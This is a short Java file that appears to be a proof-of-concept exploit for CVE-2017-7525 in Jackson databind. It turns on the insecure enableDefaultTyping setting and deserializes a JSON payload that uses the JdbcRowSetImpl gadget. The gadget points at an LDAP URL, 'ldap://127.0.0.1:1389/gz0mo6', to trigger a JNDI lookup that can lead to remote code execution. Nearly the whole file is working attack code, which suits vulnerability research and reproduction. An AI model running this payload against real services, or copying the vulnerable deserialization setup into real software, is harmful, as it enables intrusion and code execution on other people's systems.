package org.example;

import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.databind.DeserializationConfig;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

/**
 * Hello world!
 *
 */
public class CVE_2017_7525
{
    public static void main( String[] args ) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();
        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);
//        objectMapper.enableDefaultTyping();

        // 用ObjectMapper.disableDefaultTyping()设置为只允许@JsonTypeInfo生效
//                objectMapper.disableDefaultTyping();

//        Method disableDefaultTypingM = objectMapper.getClass().getMethod("disableDefaultTyping");
//        disableDefaultTypingM.invoke(objectMapper);

        String json = "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/gz0mo6\",\"autoCommit\":true}";
        System.out.println(json);
        objectMapper.readValue(json, Object.class);
    }
}
